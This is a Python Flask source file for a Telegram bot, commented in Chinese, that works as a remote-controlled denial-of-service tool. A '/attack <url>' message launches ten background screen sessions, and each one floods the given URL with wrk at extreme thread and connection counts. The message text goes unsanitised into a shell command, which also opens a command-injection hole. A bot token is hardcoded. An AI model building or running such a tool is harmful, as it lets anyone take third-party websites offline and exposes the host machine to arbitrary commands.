import os
import random
import string
import subprocess
from flask import Flask, request
import requests

# 初始化 Telegram Bot
BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Flask 应用初始化
app = Flask(__name__)

def generate_screen_name():
    """生成随机 screen 名称"""
    return "screen_" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def execute_wrk(url):
    """启动 10 个不同的 screen 会话，每个会话执行一次 wrk 命令"""
    results = []
    for i in range(10):
        screen_name = generate_screen_name()
        command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
        try:
            subprocess.run(command, shell=True, check=True)
            results.append(f"Started attack in screen session: {screen_name}")
        except subprocess.CalledProcessError as e:
            results.append(f"Failed to execute wrk in screen {screen_name}: {str(e)}")
    return "\n".join(results)

def send_message(chat_id, text):
    """发送消息给 Telegram 用户"""
    payload = {"chat_id": chat_id, "text": text}
    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_update():
    """处理 Telegram 的更新"""
    update = request.get_json()
    if not update or "message" not in update:
        return "ok", 200

    message = update["message"]
    chat_id = message["chat"]["id"]
    text = message.get("text", "")

    if text.startswith("/attack"):
        try:
            url = text.split(" ", 1)[1]
            result = execute_wrk(url)
            send_message(chat_id, result)
        except IndexError:
            send_message(chat_id, "Usage: /attack <url>")
    else:
        send_message(chat_id, "Unsupported command.")

    return "ok", 200

if __name__ == "__main__":
    # 设置 Flask 应用监听
    app.run(host="0.0.0.0", port=5000)
